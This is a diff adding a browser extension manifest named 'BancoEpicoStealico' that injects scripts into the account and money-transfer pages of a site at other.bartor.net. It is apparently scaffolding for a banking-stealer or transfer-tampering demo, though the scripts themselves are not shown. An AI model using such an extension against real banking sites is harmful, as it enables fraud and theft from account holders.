@@ -1,0 +1,22 @@
+{
+    "manifest_version": 2,
+    "name": "BancoEpicoStealico",
+    "version": "0.1",
+    "content_scripts": [
+        {
+            "run_at" : "document_idle",
+            "matches": ["http://other.bartor.net/account/transfer"],
+            "js": ["Notification.js", "transfer.js"]
+        },
+        {
+            "run_at" : "document_idle",
+            "matches": ["http://other.bartor.net/account/transfer/*"],
+            "js": ["Notification.js", "transferDetails.js"]
+        },
+        {
+            "run_at" : "document_idle",
+            "matches": ["http://other.bartor.net/account"],
+            "js": ["account.js"]
+        }
+    ]
+  }
